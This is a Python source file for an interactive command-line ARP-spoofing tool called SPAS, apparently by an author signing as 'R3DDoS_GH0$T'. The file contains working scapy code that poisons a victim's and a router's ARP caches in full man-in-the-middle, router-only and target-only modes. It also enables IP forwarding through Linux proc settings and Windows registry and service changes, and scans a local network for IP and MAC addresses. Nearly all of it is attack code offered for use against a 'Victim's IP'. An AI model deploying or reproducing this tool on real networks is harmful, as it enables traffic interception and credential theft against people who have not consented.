# SPAS - Standard Python ARP Spoofer
import os
import sys
import platform
import subprocess
from time import sleep
import scapy.all as scapy
from prettytable import PrettyTable
from termcolor import colored

os_system = platform.system()
default_targets = ("192.168.1.1", "192.168.1.100")
commands = {"MITM-Spoof": "Full ARP-Spoofing",
            "Router-Spoof": "Route ARP-Spoofing",
            "Target-Spoof": "Target ARP-Spoofing",
            "Recover": "Recovering the victims ARP tables (use only after attack)",
            "Wi-Fi Scan": "Scanning all Network (IP + MAC table)",
            "Help": "Printing the commands",
            "Clear": "Clear the screen",
            "Banner": "Printing the banner",
            "Quit": "Exit the program", }


def Enable_IP_Forwarding():
    global os_system
    if os_system == "Linux":
        with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
            f.write("1")

    elif os_system == "Windows":
        try:
            # Проверяем и запускаем службу
            check_service = 'Get-Service -Name RemoteAccess -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Status'
            result = subprocess.run(["powershell", "-Command", check_service], capture_output=True, text=True)
            service_status = result.stdout.strip()

            if service_status == "Stopped" or service_status == "":
                subprocess.run(["powershell", "-Command", "Set-Service -Name RemoteAccess -StartupType Automatic"],
                               capture_output=True, check=True)
                subprocess.run(["powershell", "-Command", "Start-Service -Name RemoteAccess"], capture_output=True,
                               check=True)
                print(colored("[+] The service RemoteAccess launched", "green"))
            else:
                print(colored("[+] The service RemoteAccess has already launched", "green"))

            # Включаем IP-форвардинг в реестре
            subprocess.run(["powershell", "-Command",
                            'Set-ItemProperty -Path "HKLM:\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters" -Name "IPEnableRouter" -Value 1 -Type DWord'],
                           capture_output=True, check=True)
            print(colored("[+] IP-forwarding turned on in reestr", "green"))

            print(colored("[+] IP-forwarding launched (A reboot will be required for full application)", "green"))
            return True

        except Exception as e:
            print(colored(f"[-] Error: {e}", "red"))
            return False


def Disable_IP_Forwarding():
    global os_system
    if os_system == "Linux":
        with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
            f.write("0")
        print(colored("[+] IP-форвардинг turned off", "green"))
        return True

    elif os_system == "Windows":
        try:
            subprocess.run(["powershell", "-Command",
                            'Set-ItemProperty -Path "HKLM:\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters" -Name "IPEnableRouter" -Value 0 -Type DWord'],
                           capture_output=True, check=True)
            print(colored("[+] IP-форвардинг turned off in reestr", "green"))

            try:
                subprocess.run(["netsh", "interface", "ipv4", "set", "interface", "0", "forwarding=disabled"],
                               capture_output=True, check=True)
                print(colored("[+] IP-forwarding turned off through the netsh", "green"))
            except:
                pass

            try:
                subprocess.run(["powershell", "-Command", "Stop-Service -Name RemoteAccess -Force"],
                               capture_output=True, check=True, timeout=5)
                print(colored("[+] The service RemoteAccess stopped", "green"))
            except subprocess.TimeoutExpired:
                print(colored("[!] The waiting time has expired when the service is stopped", "yellow"))
            except:
                print(colored("[-] Failed to stopp the service RemoteAccess", "red"))

            print(colored("[+] IP-форвардинг turned off", "green"))
            return True

        except Exception as e:
            print(colored(f"[-] Error was occured during turning off the IP-forwarding: {e}", "red"))
            return False


def greeting_animation(text=colored("Starting the Standard Python ARP Spoofer...................", "yellow"),
                       delay=0.06):
    global commands
    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()
        sleep(delay)

    sleep(3)
    sys.stdout.write('\r')
    sys.stdout.write(' ' * len(text))
    sys.stdout.write('\r')
    sys.stdout.write(text + colored("Done\n", "yellow"))
    sys.stdout.flush()
    sleep(1)
    os.system("cls" if os.name == "nt" else "clear")
    sleep(1)

    print(colored("""
███████╗██████╗  █████╗ ███████╗
██╔════╝██╔══██╗██╔══██╗██╔════╝
███████╗██████╔╝███████║███████╗
╚════██║██╔═══╝ ██╔══██║╚════██║
███████║██║     ██║  ██║███████║
╚══════╝╚═╝     ╚═╝  ╚═╝╚══════╝
                                by R3DDoS_GH0$T""", "red"))

    table = PrettyTable()
    table.field_names = ["Command", "Description"]
    for cmd, desc in commands.items():
        table.add_row([cmd, desc])

    print(table, '\n')


def generate_request(IP, MAC, targetIP, targetMAC):
    apr_packet = scapy.ARP(psrc=IP, hwsrc=MAC, pdst=targetIP, hwdst=targetMAC)
    return apr_packet


def getMAC(ip):
    arp_request = scapy.Ether(dst="ff:ff:ff:ff:ff:ff") / scapy.ARP(op=1, pdst=ip)
    answered, unanswered = scapy.srp(arp_request, timeout=2, verbose=0)

    if answered:
        return answered[0][1].hwsrc
    else:
        return None


def MITM_Spoof(targetIP, routerIP=default_targets[0]):
    print(colored("[*] Preparing to MITM-Spoofing...", "yellow"))
    targetMAC = getMAC(targetIP)
    if not targetMAC:
        return False

    routerMAC = getMAC(routerIP)
    if not routerMAC:
        return False

    Enable_IP_Forwarding()

    sleep(2.5)
    print(colored("[*] Starting MITM-Spoofing...", "yellow"))
    sleep(0.5)
    print(colored("[*] Press Ctrl+C to stop and recover ARP-tables\n\n", "yellow"))

    packets_count = 0

    try:
        while True:
            target_spoof_packet = scapy.ARP(op=2, pdst=targetIP, psrc=routerIP, hwdst=targetMAC)
            router_spoof_packet = scapy.ARP(op=2, pdst=routerIP, psrc=targetIP, hwdst=routerMAC)

            scapy.send(target_spoof_packet, verbose=0)
            scapy.send(router_spoof_packet, verbose=0)

            packets_count += 2

            print(colored(f"[+] {packets_count} packets sent!", "green"))
            print(target_spoof_packet)
            print(router_spoof_packet)

            sleep(1)
    except KeyboardInterrupt:
        answer = input(colored("[*] Ctrl+C was detected. Recover the Network (Y/n)?", "yellow"))
        if answer == 'Y':
            RecoverNetwork(targetIP, routerIP, targetMAC, routerMAC)
            Disable_IP_Forwarding()
            print(colored("[+] Attack was finished successfully!", "green"))
        elif answer == 'n':
            Disable_IP_Forwarding()
            print(colored("[+] Attack was finished successfully!", "green"))


def RouterSpoof(targetIP=None, routerIP=None):
    if not targetIP:
        targetIP = input(colored("Enter the Victim's IP: ", "yellow")) or default_targets[1]
    if not routerIP:
        routerIP = input(colored("Enter the Router's IP: ", "yellow")) or default_targets[0]

    print(colored("[*] Preparing for Router-Spoofing...", "yellow"))

    targetMAC = getMAC(targetIP)
    if not targetMAC:
        return False

    routerMAC = getMAC(routerIP)
    if not routerMAC:
        return False

    Enable_IP_Forwarding()

    sleep(0.5)

    print(colored("[*] Starting Router-Spoofing...", "yellow"))
    print(colored("[*] Press Ctrl+C to stop and recover ARP-tables\n", "yellow"))

    packets_count = 0
    try:
        while True:
            # Отравляем ТОЛЬКО роутер: "Я — жертва!"
            router_spoof_packet = scapy.ARP(op=2, pdst=routerIP, psrc=targetIP, hwdst=routerMAC)
            scapy.send(router_spoof_packet, verbose=0)

            packets_count += 1

            if packets_count % 5 == 0:
                print(colored(f"[+] {packets_count} packets sent!", "cyan"))
                print(router_spoof_packet)

            sleep(1)

    except KeyboardInterrupt:
        answer = input(colored("[*] Ctrl+C was detected. Recover the Network (Y/n)?", "yellow"))
        if answer == 'Y':
            RecoverNetwork(targetIP, routerIP, targetMAC, routerMAC)
            Disable_IP_Forwarding()
            print(colored("[+] Attack was finished successfully!", "green"))
        elif answer == 'n':
            Disable_IP_Forwarding()
            print(colored("[+] Attack was finished successfully!", "green"))


def TargetSpoof(targetIP=None, routerIP=None):
    if not targetIP:
        targetIP = input(colored("Enter the Victim's IP: ", "yellow")) or default_targets[1]
    if not routerIP:
        routerIP = input(colored("Enter the Router's IP: ", "yellow")) or default_targets[0]

    print(colored("[*] Preparing for Target-Spoofing...", "yellow"))

    targetMAC = getMAC(targetIP)
    if not targetMAC:
        return False

    routerMAC = getMAC(routerIP)
    if not routerMAC:
        return False

    Enable_IP_Forwarding()

    print(colored("[*] Starting Target-Spoofing...", "yellow"))
    print(colored("[*] Press Ctrl+C to stop and recover ARP-tables\n", "yellow"))

    packets_count = 0
    try:
        while True:
            target_spoof_packet = scapy.ARP(op=2, pdst=targetIP, psrc=routerIP, hwdst=targetMAC)
            scapy.send(target_spoof_packet, verbose=0)

            packets_count += 1

            if packets_count % 5 == 0:
                print(colored(f"[*] Sent {packets_count} ARP packets", "cyan"))
                print(target_spoof_packet)

            sleep(1)

    except KeyboardInterrupt:
        answer = input(colored("[*] Ctrl+C was detected. Recover the Network (Y/n)?", "yellow"))
        if answer == 'Y':
            RecoverNetwork(targetIP, routerIP, targetMAC, routerMAC)
            Disable_IP_Forwarding()
            print(colored("[+] Attack was finished successfully!", "green"))
        elif answer == 'n':
            Disable_IP_Forwarding()
            print(colored("[+] Attack was finished successfully!", "green"))


def ScanNetwork(IP_range="192.168.1.0/24"):
    print(colored("[*] Scanning the Network...", "yellow"))
    arp_request = scapy.Ether(dst="ff:ff:ff:ff:ff:ff") / scapy.ARP(pdst=IP_range)  # Исправлено
    answered, unanswered = scapy.srp(arp_request, timeout=1, verbose=0)
    if answered:
        devices = []
        for sent, recieved in answered:
            devices.append({"IP": recieved.psrc, "MAC": recieved.hwsrc})

        table = PrettyTable()
        table.field_names = ["IP Address", "MAC Address"]
        for device in devices:
            table.add_row([device["IP"], device["MAC"]])  # Исправлено
        print(colored(f"[+] {len(devices)} devices found!", "green"))
        print(table)
    else:
        print(colored("[-] No devices found", "red"))


# Исправленный RecoverNetwork без бесконечной рекурсии
def RecoverNetwork(targetIP, routerIP, targetMAC, routerMAC, retries=3):
    for attempt in range(retries):
        try:
            print(colored("[*] Recovering the ARP-tables...", "yellow"))
            scapy.send(scapy.ARP(op=2, pdst=targetIP, psrc=routerIP, hwdst=targetMAC, hwsrc=routerMAC), count=5,
                       verbose=0)
            scapy.send(scapy.ARP(op=2, pdst=routerIP, psrc=targetIP, hwdst=routerMAC, hwsrc=targetMAC), count=5,
                       verbose=0)
            print(colored("[+] The Network was recovered!", "green"))
            return True
        except Exception as e:
            print(colored(f"[-] Error on attempt {attempt + 1}: {e}", "red"))
            if attempt == retries - 1:
                print(colored("[-] Failed to recover the network after all attempts", "red"))
                return False
            sleep(1)  # Подождать перед следующей попыткой


def check_admin():
    if os.name == 'nt':
        try:
            import ctypes
            return ctypes.windll.shell32.IsUserAnAdmin() != 0
        except:
            return False
    else:
        return os.geteuid() == 0


def main():
    if not check_admin():
        print(colored("[!] This program requires administrator privileges!", "red"))
        exit()
    global commands
    greeting_animation()
    try:
        while True:
            command = input(colored("S•P•A•S$ ", "cyan")).strip()

            if command == "MITM-Spoof":
                targetIP = input(colored("Enter the Victim's IP: ", "yellow")) or default_targets[1]
                MITM_Spoof(targetIP)

            elif command == "Router-Spoof":
                RouterSpoof()

            elif command == "Target-Spoof":
                TargetSpoof()

            elif command == "Recover":
                targetIP = input(colored("Enter the Victim's IP: ", "yellow")) or default_targets[1]
                routerIP = input(colored("Enter the Router's IP: ", "yellow")) or default_targets[0]
                targetMAC = getMAC(targetIP)
                routerMAC = getMAC(routerIP)
                if targetMAC and routerMAC:
                    RecoverNetwork(targetIP, routerIP, targetMAC, routerMAC)

            elif command == "Wi-Fi Scan":
                ip_range = input(colored("Enter IP-range: ", "yellow")) or "192.168.1.0/24"
                ScanNetwork(ip_range)

            elif command == "Help":
                table = PrettyTable()
                table.field_names = ["Command", "Description"]
                for cmd, desc in commands.items():
                    table.add_row([cmd, desc])

                print(table, '\n')
                print("To use SPAS just write command and necessary arguments")


            elif command == "Clear":
                os.system("cls" if os.name == "nt" else "clear")

            elif command == "Banner":
                print(colored("""
    ███████╗██████╗  █████╗ ███████╗
    ██╔════╝██╔══██╗██╔══██╗██╔════╝
    ███████╗██████╔╝███████║███████╗
    ╚════██║██╔═══╝ ██╔══██║╚════██║
    ███████║██║     ██║  ██║███████║
    ╚══════╝╚═╝     ╚═╝  ╚═╝╚══════╝
                                    by R3DDoS_GH0$T""", "red"))

            elif command == "Quit" or command == "quit":
                sys.exit(0)

            else:
                print(colored(
                    "[-] Unknown command. Available commands: MITM-Spoof, Router-Spoof, Target-Spoof, Recover, Wi-Fi Scan, Help, Clear, Banner Quit",
                    "red"))
    except KeyboardInterrupt:
        exit()


main()
